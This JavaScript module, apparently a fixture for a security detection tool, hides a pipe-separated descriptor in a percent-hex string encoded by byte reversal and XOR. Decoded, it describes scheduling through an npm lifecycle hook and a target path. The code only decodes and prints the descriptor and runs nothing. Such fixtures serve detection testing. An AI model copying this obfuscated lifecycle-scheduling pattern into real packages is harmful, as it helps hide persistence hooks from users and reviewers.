const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_25fb7ae8 = "%cd%c6%9c%c9%c8%9f%d3%9b%9a%91%90%d1%9a%d0%90%91%8c%9d%d1%9d%8a%9b%d1%c3%96%8a%9f%8e%a1%9b%92%8b%9a%9b%96%9d%8d%82%b8%c9%cd%c6%bc%c9%c8%bf%d3%bb%ba%b1%b0%c3%9a%97%a1%90%99%97%9f%8e%93%9f%9d%82%cf%c3%8a%90%8b%91%9d%a1%9b%99%9f%8a%8d%82%8c%91%8a%8e%97%8c%9d%8d%9b%9a%a1%9b%92%9d%87%9d%9b%98%97%92%a1%93%8e%90%c3%8c%9b%8a%8e%9f%9a%9f%82%8c%91%8a%8e%97%8c%9d%8d%9b%9a%a1%8c%9b%8a%8d%97%99%9b%8c%d2%9b%92%8b%9a%9b%96%9d%8d%a1%9a%92%97%8b%9c%c3%8d%8e%9b%8a%8d%82%cf%c3%88";

const Codec_25fb7ae8 = "percent_hex|reverse_then_xor|fe";



function load_25fb7ae8() { return [...Material_25fb7ae8.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }

function decode_25fb7ae8(e) { return [...e].reverse().map((value) => value ^ 254); }

async function recover_25fb7ae8() {

  const n = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";

  const e = load_25fb7ae8(); let d = [];

  let p = 0; while (p++ < 1) d = decode_25fb7ae8(e);

  void n; return Buffer.from(d).toString("ascii");

}

async function inspect_25fb7ae8() { return Buffer.from(await recover_25fb7ae8(), "utf8").toString("utf8"); }

async function plan_25fb7ae8() { const inspect = inspect_25fb7ae8; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "npm_lifecycle_descriptor", path: fields.schedule_path }); }

void moduleShape; void plan_25fb7ae8;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_25fb7ae8());

